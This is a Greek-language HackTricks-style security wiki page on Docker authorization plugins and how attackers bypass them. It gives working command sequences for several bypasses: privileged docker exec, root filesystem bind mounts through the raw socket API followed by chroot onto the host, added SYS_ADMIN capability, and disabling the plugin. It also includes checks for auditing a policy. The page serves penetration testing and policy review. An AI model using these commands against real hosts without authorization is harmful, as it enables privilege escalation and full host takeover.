# Πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης είναι ένα επιπλέον επίπεδο πολιτικής που αποφασίζει εάν ένας καλών μπορεί να εκτελέσει μια δεδομένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, οποιοσδήποτε μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρεία έλεγχο πάνω σε αυτό. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον πιστοποιημένο χρήστη και την αιτούμενη API ενέργεια, και επιτρέποντας ή απορρίπτοντας το αίτημα σύμφωνα με την πολιτική.

Αυτό το θέμα αξίζει ξεχωριστή σελίδα επειδή αλλάζει το μοντέλο εκμετάλλευσης όταν ένας επιτιθέμενος έχει ήδη πρόσβαση στο Docker API ή σε έναν χρήστη της ομάδας `docker`. Σε τέτοια περιβάλλοντα το ερώτημα δεν είναι πλέον μόνο «μπορώ να φτάσω το daemon;» αλλά και «έχει περιφραχτεί ο daemon από ένα επίπεδο εξουσιοδότησης, και αν ναι, μπορεί αυτό το επίπεδο να παρακαμφθεί μέσω μη χειρισμένων endpoints, αδύναμου JSON parsing, ή δικαιωμάτων διαχείρισης plugins;»

## Λειτουργία

Όταν ένα αίτημα φτάνει στον Docker daemon, το υποσύστημα εξουσιοδότησης μπορεί να περάσει το context του αιτήματος σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την ταυτότητα του πιστοποιημένου χρήστη, τις λεπτομέρειες του αιτήματος, επιλεγμένα headers, και μέρη του σώματος του αιτήματος ή της απάντησης όταν ο τύπος περιεχομένου είναι κατάλληλος. Πολλαπλά plugins μπορούν να συνδεθούν σε σειρά, και η πρόσβαση χορηγείται μόνο αν όλα τα plugins επιτρέπουν το αίτημα.

Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα ο συντάκτης της πολιτικής κατάλαβε το API. Ένα plugin που μπλοκάρει `docker run --privileged` αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON κλειδιά όπως το top-level `Binds`, ή επιτρέπει τη διαχείριση plugins, μπορεί να δημιουργήσει ψευδή αίσθηση περιορισμού ενώ αφήνει ανοιχτές άμεσες διαδρομές privilege escalation.

## Συνήθης στόχοι των plugins

Σημαντικές περιοχές για ανασκόπηση της πολιτικής είναι:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Ιστορικά, παραδείγματα όπως το Twistlock's `authz` plugin και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη επειδή τα αρχεία πολιτικής και οι διαδρομές κώδικα έδειχναν πώς η αντιστοίχιση endpoint-προς-ενέργεια υλοποιούνταν στην πράξη. Για εργασίες αξιολόγησης, το σημαντικό μάθημα είναι ότι ο συντάκτης της πολιτικής πρέπει να κατανοεί ολόκληρη την επιφάνεια του API και όχι μόνο τις πιο ορατές εντολές CLI.

## Κατάχρηση

Ο πρώτος στόχος είναι να μάθετε τι πραγματικά μπλοκάρεται. Εάν ο daemon απορρίψει μια ενέργεια, το σφάλμα συχνά leaks το όνομα του plugin, πράγμα που βοηθά στον εντοπισμό του ελέγχου που χρησιμοποιείται:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα γιατί αυτοματοποιούν το αλλιώς επαναλαμβανόμενο έργο του να ελέγχετε ποιες API routes και JSON structures επιτρέπονται πραγματικά από το plugin.

Αν το περιβάλλον χρησιμοποιεί ένα custom plugin και μπορείτε να αλληλεπιδράσετε με το API, απαριθμήστε ποια πεδία αντικειμένων φιλτράρονται πραγματικά:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Αυτοί οι έλεγχοι έχουν σημασία επειδή πολλές αποτυχίες εξουσιοδότησης είναι ειδικές σε πεδία παρά σε έννοιες. Ένα plugin μπορεί να απορρίψει ένα πρότυπο CLI χωρίς να μπλοκάρει πλήρως την αντίστοιχη δομή API.

### Πλήρες παράδειγμα: `docker exec` προσθέτει προνόμια μετά τη δημιουργία container

Μια πολιτική που μπλοκάρει τη δημιουργία container με προνόμια αλλά επιτρέπει τη δημιουργία μη περιορισμένου container σε συνδυασμό με `docker exec` μπορεί ακόμα να παρακαμφθεί:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
If the daemon accepts the second step, the user has recovered a privileged interactive process inside a container the policy author believed was constrained.

### Full Example: Bind Mount Through Raw API

Κάποιες ελαττωματικές πολιτικές ελέγχουν μόνο ένα JSON shape. Εάν το root filesystem bind mount δεν αποκλείεται με συνέπεια, το host εξακολουθεί να μπορεί να mounted:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Η ίδια ιδέα μπορεί επίσης να εμφανιστεί στο `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Ο αντίκτυπος είναι πλήρης host filesystem escape. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προέρχεται από ελλιπή κάλυψη της πολιτικής αντί από σφάλμα στον kernel.

### Πλήρες Παράδειγμα: Μη ελεγχόμενη ιδιότητα capability

Αν η πολιτική ξεχάσει να φιλτράρει μια ιδιότητα σχετική με capability, ο attacker μπορεί να δημιουργήσει ένα container που ανακτά μια επικίνδυνη capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Μόλις το `CAP_SYS_ADMIN` ή μια παρόμοια ισχυρή capability υπάρχει, πολλές breakout techniques που περιγράφονται στο [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md) γίνονται προσβάσιμες.

### Πλήρες Παράδειγμα: Απενεργοποίηση του Plugin

Εάν οι plugin-management λειτουργίες επιτρέπονται, το πιο καθαρό bypass μπορεί να είναι να απενεργοποιήσετε εντελώς τον έλεγχο:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Αυτή είναι μια αποτυχία πολιτικής στο επίπεδο του control-plane. Η στρώση εξουσιοδότησης υπάρχει, αλλά ο χρήστης που επρόκειτο να περιορίσει εξακολουθεί να διατηρεί την άδεια να την απενεργοποιήσει.

## Έλεγχοι

Αυτές οι εντολές αποσκοπούν στο να εντοπίσουν εάν υπάρχει στρώμα πολιτικής και αν φαίνεται πλήρες ή επιφανειακό.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Μηνύματα άρνησης που περιλαμβάνουν ένα όνομα plugin επιβεβαιώνουν ένα επίπεδο εξουσιοδότησης και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
- Μια λίστα plugin που είναι ορατή στον επιτιθέμενο μπορεί να αρκεί για να διαπιστωθεί αν οι ενέργειες απενεργοποίησης ή επαναδιαμόρφωσης είναι δυνατές.
- Μια πολιτική που μπλοκάρει μόνο προφανείς ενέργειες CLI αλλά όχι raw API requests θα πρέπει να θεωρείται παρακάμπσιμη μέχρι να αποδειχθεί το αντίθετο.

## Προεπιλογές χρόνου εκτέλεσης

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Η πρόσβαση στο daemon είναι ουσιαστικά όλα-ή-τίποτα εκτός αν έχει ρυθμιστεί plugin εξουσιοδότησης | ελλιπής πολιτική plugin, μαύρες λίστες αντί για λίστες επιτρεπόμενων, επιτρέποντας τη διαχείριση plugin, τυφλά σημεία σε επίπεδο πεδίου |
| Podman | Not a common direct equivalent | Το Podman συνήθως βασίζεται περισσότερο σε Unix permissions, εκτέλεση χωρίς root και αποφάσεις έκθεσης API παρά σε Docker-style authz plugins | ευρεία έκθεση ενός Podman API με δικαιώματα root, αδύναμα δικαιώματα socket |
| containerd / CRI-O | Different control model | Αυτά τα runtimes συνήθως βασίζονται σε δικαιώματα socket, όρια εμπιστοσύνης κόμβων και ελέγχους του orchestrator σε ανώτερο επίπεδο παρά σε Docker authz plugins | κάνoντας mount το socket μέσα σε workloads, αδύναμες τοπικές στο κόμβο υποθέσεις εμπιστοσύνης |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Το Cluster RBAC και οι admission controls είναι το κύριο επίπεδο πολιτικής | υπερβολικά ευρύ RBAC, αδύναμη admission πολιτική, απευθείας έκθεση kubelet ή runtime APIs |
{{#include ../../../banners/hacktricks-training.md}}
